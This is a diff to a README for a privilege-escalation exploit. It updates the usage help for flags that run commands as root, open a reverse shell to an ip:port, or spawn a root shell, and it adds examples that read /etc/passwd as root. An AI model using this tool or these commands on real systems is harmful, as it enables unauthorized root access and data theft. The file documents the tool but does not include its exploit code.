@@ -32,9 +32,10 @@ As the Go payload is not as reliable as the C one, the ***Makefile*** will compi
 $> ./exploit -h
 Usage of ./exploit:
   -c string
-        Command to execute as root
+        Run command as root in separate process
+  -o    Pipe output of fork command to terminal
   -r string
-        Open a reverse-shell instead. Format: ip:port
+        Open a reverse-shell in separate process. Format: ip:port
   -s    Spawn a root shell
 ```
 
@@ -42,9 +43,18 @@ The exploit can either be used with a command (`-c`), as a reverse-shell (`-r`) 
 
 
 
-```
+```bash
 $> ./exploit -s
 sh-5.1#
+```
+
+```bash
+$> ./exploit -c "cat /etc/passwd"
+```
+
+```bash
+$> ./exploit -o -c "cat /etc/passwd"
+[/etc/passwd content]
 ```
 
 
